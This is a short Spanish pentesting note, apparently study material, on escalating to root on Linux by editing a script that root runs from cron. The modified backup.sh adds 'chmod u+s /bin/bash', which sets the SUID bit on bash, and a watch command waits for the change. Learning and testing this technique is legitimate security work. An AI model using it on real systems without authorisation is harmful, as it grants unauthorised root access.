Permisos de archivos

Los permisos de archivos y scripts son relevantes cuando un proceso privilegiado ejecuta contenido que puede modificar un usuario no privilegiado.

Buscar binarios donde un usuario es propietario

find / -user <username> 2>/dev/null

# Ej. Encontramos un backup.sh
#!/bin/bash

cp -r /usr/share/wordpress /tmp/tmp_wp_uploads

Si /tmp/tmp_wp_uploads aparece como propiedad de root, es una pista de que el script puede estar ejecutándose como root, por ejemplo mediante una tarea cron. Hay que confirmar el contexto antes de modificar nada.

backup.sh modificado: Esperar que root ejecute este script y otorgue permisos SUID a la bash

#!/bin/bash

cp -r /usr/share/wordpress /tmp/tmp_wp_uploads
chmod u+s /bin/bash

Monitorizamos los permisos de la bash y ejecutamos la bash con SUID

watch -n 1 ls -l /bin/bash
